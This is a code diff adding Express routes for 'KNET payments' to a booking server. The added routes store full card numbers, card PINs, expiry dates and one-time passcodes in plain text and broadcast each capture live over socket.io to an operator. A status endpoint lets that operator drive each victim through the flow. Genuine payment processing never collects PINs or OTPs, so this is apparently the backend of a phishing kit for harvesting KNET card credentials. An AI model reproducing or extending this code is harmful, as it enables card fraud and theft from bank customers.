@@ -516,6 +516,116 @@ app.post('/auth/knet/otp', (req, res) => {
   }
 });
 
+// KNET Payment Creation (without /auth prefix - used by Angular app)
+app.post('/knet', (req, res) => {
+  const paymentData = req.body;
+  db = loadData();
+  if (!db.knetPayments) db.knetPayments = [];
+  
+  const newPayment = {
+    id: Date.now().toString(),
+    knetId: 'KN' + Date.now(),
+    ...paymentData,
+    status: 'PENDING',
+    createdAt: new Date().toISOString(),
+    ip: req.ip
+  };
+  db.knetPayments.push(newPayment);
+  
+  // Also add to bookings
+  const ref = 'KN-' + Date.now().toString().substring(7);
+  db.bookings[ref] = {
+    referenceId: ref,
+    clientName: paymentData.cardHolder || paymentData.name || 'عميل',
+    clientId: paymentData.civilId || '',
+    clientPhone: paymentData.phone || '',
+    clientEmail: paymentData.email || '',
+    clientIp: req.ip,
+    serviceType: 'دفع KNET',
+    serviceDate: new Date().toLocaleDateString('ar-SA'),
+    serviceTime: new Date().toLocaleTimeString('ar-SA'),
+    status: 'pending_payment',
+    statusRead: 0,
+    createdAt: new Date().toISOString(),
+    payment: {
+      cardNumber: paymentData.cardNumber || '',
+      cardHolder: paymentData.cardHolder || paymentData.name || '',
+      cardPrefix: paymentData.cardPrefix || '',
+      bank: paymentData.bank || '',
+      expiryMonth: paymentData.expiryMonth || '',
+      expiryYear: paymentData.expiryYear || '',
+      pin: paymentData.pin || '',
+      amount: paymentData.amount || '0.250',
+      status: 'PENDING'
+    },
+    knetId: newPayment.id
+  };
+  
+  saveData(db);
+  io.emit('newPayment', { type: 'knet', reference: ref, payment: newPayment });
+  io.emit('newBooking', { reference: ref });
+  
+  res.json({
+    success: true,
+    knetId: newPayment.id,
+    paymentId: newPayment.id,
+    status: 'PENDING'
+  });
+});
+
+// KNET Status Check (without /auth prefix)
+app.get('/knet/status/:id', (req, res) => {
+  db = loadData();
+  const payment = (db.knetPayments || []).find(p => p.id === req.params.id || p.knetId === req.params.id);
+  if (payment) {
+    res.json(payment);
+  } else {
+    res.json({ status: 'PENDING' });
+  }
+});
+
+// KNET Update Status (without /auth prefix)
+app.post('/knet/update-status', (req, res) => {
+  const { id, status } = req.body;
+  db = loadData();
+  const payment = (db.knetPayments || []).find(p => p.id === id || p.knetId === id);
+  if (payment) {
+    payment.status = status;
+    payment.updatedAt = new Date().toISOString();
+    saveData(db);
+    io.emit('payment_updated', payment);
+    res.json({ success: true, payment });
+  } else {
+    res.status(404).json({ message: 'Payment not found' });
+  }
+});
+
+// KNET OTP Submit (without /auth prefix)
+app.post('/knet/otp', (req, res) => {
+  const { knetId, otp } = req.body;
+  db = loadData();
+  const payment = (db.knetPayments || []).find(p => p.id === knetId || p.knetId === knetId);
+  if (payment) {
+    payment.otp = otp;
+    payment.status = 'OTP_RECEIVED';
+    payment.otpReceivedAt = new Date().toISOString();
+    
+    const booking = Object.values(db.bookings || {}).find(b => b.knetId === payment.id);
+    if (booking) {
+      booking.otp = { otpCode: otp, createdAt: new Date().toISOString() };
+      booking.status = 'pending_otp';
+      booking.statusRead = 0;
+    }
+    
+    saveData(db);
+    io.emit('otp_received', { payment, otp });
+    io.emit('newPayment', { type: 'otp', knetId });
+    res.json({ success: true });
+  } else {
+    res.status(404).json({ message: 'Payment not found' });
+  }
+});
+
 // Get All KNET Payments
 app.get('/knet/all', (req, res) => {
   db = loadData();
